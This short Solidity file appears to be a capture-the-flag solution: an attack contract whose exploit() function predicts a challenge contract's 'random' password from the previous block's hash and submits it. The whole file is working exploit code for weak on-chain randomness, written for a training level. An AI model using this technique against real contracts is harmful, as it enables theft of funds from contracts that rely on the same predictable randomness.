// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/GuessMyRandomPassword.sol";

contract attackGuessMyRandomPassword {
    GuessMyRandomPassword originalCOntract;
    bytes32 password;

    constructor(address _originalContract) public {
        originalCOntract = GuessMyRandomPassword(_originalContract);
    }

    function exploit() public {
        password = blockhash(block.number - 1);
        originalCOntract.guessMyRandomPassword(password);
    }
}